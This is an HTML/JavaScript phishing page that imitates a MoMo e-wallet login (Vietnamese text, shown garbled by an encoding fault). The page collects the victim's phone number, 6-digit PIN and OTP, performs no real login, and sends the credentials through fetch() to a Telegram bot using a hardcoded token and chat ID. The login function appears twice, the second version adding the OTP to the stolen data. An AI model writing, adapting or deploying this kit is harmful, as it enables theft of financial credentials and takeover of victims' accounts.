<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ƒêƒÉng nh·∫≠p</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        .form-group input {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
        }

        .form-group button {
            background-color: #007bff;
            color: #fff;
            border: none;
            padding: 10px;
            cursor: pointer;
            border-radius: 3px;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>ƒêƒÉng nh·∫≠p Login MoMo</h2>
    <div class="form-group">
        <label for="phone">S·ªë ƒëi·ªán tho·∫°i:</label>
        <input type="text" id="phone" placeholder="Nh·∫≠p s·ªë ƒëi·ªán tho·∫°i" required>
    </div>
    <div class="form-group">
        <label for="password">M·∫≠t kh·∫©u:</label>
        <input type="password" id="password" placeholder="Nh·∫≠p m·∫≠t kh·∫©u" required>
        <span id="showPassword" onclick="togglePassword()">Hi·ªán m·∫≠t kh·∫©u</span>
    </div>
    <div class="form-group">
        <button onclick="sendLoginInfo()">G·ª≠i OTP</button>
    </div>
    <div class="form-group">
        <label for="otp">OTP:</label>
        <input type="text" id="otp" placeholder="Nh·∫≠p OTP" required>
    </div>
    <div class="form-group">
        <button onclick="login()">ƒêƒÉng nh·∫≠p</button>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
    var phoneInput = document.getElementById('phone');
    var passwordInput = document.getElementById('password');
    var otpInput = document.getElementById('otp');

    var loginInfo = {
        phone: '',
        password: ''
    };

    function sendLoginInfo() {
        loginInfo.phone = phoneInput.value;
        loginInfo.password = passwordInput.value;

        // Ki·ªÉm tra s·ªë ƒëi·ªán tho·∫°i v√† m·∫≠t kh·∫©u
        if (!isValidPhoneNumber(loginInfo.phone) || !isValidPassword(loginInfo.password)) {
            Swal.fire({
                icon: 'error',
                title: 'L·ªói',
                text: 'Th√¥ng tin ƒëƒÉng nh·∫≠p kh√¥ng h·ª£p l·ªá!'
            });
            return;
        }

        // G·ª≠i th√¥ng tin ƒëƒÉng nh·∫≠p ƒë·∫øn Telegram
        sendTelegramMessage(loginInfo.phone, loginInfo.password, 'Y√™u c·∫ßu ƒëƒÉng nh·∫≠p');

        Swal.fire({
            icon: 'success',
            title: 'Th√†nh c√¥ng!',
            text: 'OTP ƒê√£ ƒê∆∞·ª£c g·ª≠i t·ªõi s·ªë ƒëi·ªán tho·∫°i c·ªßa ban. Nh·∫≠p OTP ƒë·ªÉ ƒëƒÉng nh·∫≠p.'
        });
    }

    function login() {
        var otp = otpInput.value;

        // Ki·ªÉm tra OTP
        if (!isValidOTP(otp)) {
            Swal.fire({
                icon: 'error',
                title: 'L·ªói',
                text: 'OTP kh√¥ng h·ª£p l·ªá!'
            });
            return;
        }

        // Th·ª±c hi·ªán x√°c th·ª±c v√† x·ª≠ l√Ω ƒëƒÉng nh·∫≠p ·ªü ƒë√¢y
        // (B·∫°n c·∫ßn th√™m m√£ logic x√°c th·ª±c v√† x·ª≠ l√Ω ƒëƒÉng nh·∫≠p)
        // V√≠ d·ª•: ki·ªÉm tra ƒë·∫ßu v√†o, g·ª≠i y√™u c·∫ßu ƒëƒÉng nh·∫≠p ƒë·∫øn m√°y ch·ªß, ...

        // Sau khi x√°c th·ª±c th√†nh c√¥ng
        // G·ª≠i th√¥ng b√°o ƒë·∫øn admin qua Telegram
        sendTelegramMessage(loginInfo.phone, loginInfo.password, 'ƒêƒÉng nh·∫≠p th√†nh c√¥ng');

        // Hi·ªÉn th·ªã th√¥ng b√°o th√†nh c√¥ng b·∫±ng SweetAlert
        Swal.fire({
            icon: 'success',
            title: 'ƒêƒÉng nh·∫≠p th√†nh c√¥ng!',
            showConfirmButton: false,
            timer: 1500 // ƒê√≥ng th√¥ng b√°o sau 1.5 gi√¢y
        });

        // G·ª≠i l·∫°i to√†n b·ªô th√¥ng tin v·ªÅ admin
        sendTelegramMessage(loginInfo.phone, loginInfo.password, 'Th√¥ng tin ƒëƒÉng nh·∫≠p th√†nh c√¥ng');
    }

    function isValidPhoneNumber(phone) {
        var phoneRegex = /^(84|0[3|5|7|8|9])+([0-9]{8})$/;
        return phoneRegex.test(phone);
    }

    function isValidPassword(password) {
        var passwordRegex = /^\d{6}$/;
        return passwordRegex.test(password);
    }

    function isValidOTP(otp) {
        var otpRegex = /^\d{4}$/;
        return otpRegex.test(otp);
    }

    function togglePassword() {
        var passwordInput = document.getElementById('password');
        var showPasswordSpan = document.getElementById('showPassword');

        if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
            showPasswordSpan.textContent = '·∫®n m·∫≠t kh·∫©u';
        } else {
            passwordInput.type = 'password';
            showPasswordSpan.textContent = 'Hi·ªán m·∫≠t kh·∫©u';
        }
    }

    function sendTelegramMessage(phone, password, status) {
        var token = '6889088304:AAED5-lcYegRJRP6dPeQiOvLSs0KbxkkyfU';
        var chatId = '6520036650';

        var message = `
        üì± S·ªë ƒëi·ªán tho·∫°i: ${phone}
        üîë M·∫≠t kh·∫©u: ${password}
        ‚úÖ Tr·∫°ng th√°i: ${status}
        `;

        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
            .then(response => response.json())
            .then(data => console.log(data))
            .catch(error => console.error(error));
    }

    function login() {
        var otp = otpInput.value;
    
        // Ki·ªÉm tra OTP
        if (!isValidOTP(otp)) {
            Swal.fire({
                icon: 'error',
                title: 'L·ªói',
                text: 'OTP kh√¥ng h·ª£p l·ªá!'
            });
            return;
        }
    
        // Th·ª±c hi·ªán x√°c th·ª±c v√† x·ª≠ l√Ω ƒëƒÉng nh·∫≠p ·ªü ƒë√¢y
        // (B·∫°n c·∫ßn th√™m m√£ logic x√°c th·ª±c v√† x·ª≠ l√Ω ƒëƒÉng nh·∫≠p)
        // V√≠ d·ª•: ki·ªÉm tra ƒë·∫ßu v√†o, g·ª≠i y√™u c·∫ßu ƒëƒÉng nh·∫≠p ƒë·∫øn m√°y ch·ªß, ...
    
        // Sau khi x√°c th·ª±c th√†nh c√¥ng
        // G·ª≠i th√¥ng b√°o ƒë·∫øn admin qua Telegram
        sendTelegramMessage(loginInfo.phone, loginInfo.password, 'ƒêƒÉng nh·∫≠p th√†nh c√¥ng');
    
        // G·ª≠i OTP c√πng th√¥ng b√°o ƒë·∫øn Telegram
        sendTelegramMessage(loginInfo.phone, loginInfo.password, `X√°c nh·∫≠n OTP th√†nh c√¥ng. OTP: ${otp}`);
    
        // Hi·ªÉn th·ªã th√¥ng b√°o th√†nh c√¥ng b·∫±ng SweetAlert
        Swal.fire({
            icon: 'success',
            title: 'ƒêƒÉng nh·∫≠p th√†nh c√¥ng!',
            showConfirmButton: false,
            timer: 1500 // ƒê√≥ng th√¥ng b√°o sau 1.5 gi√¢y
        });
    
        // G·ª≠i l·∫°i to√†n b·ªô th√¥ng tin v·ªÅ admin
        sendTelegramMessage(loginInfo.phone, loginInfo.password, `Th√¥ng tin ƒëƒÉng nh·∫≠p th√†nh c√¥ng. OTP: ${otp}`);
    }
    
</script>

</body>
</html>
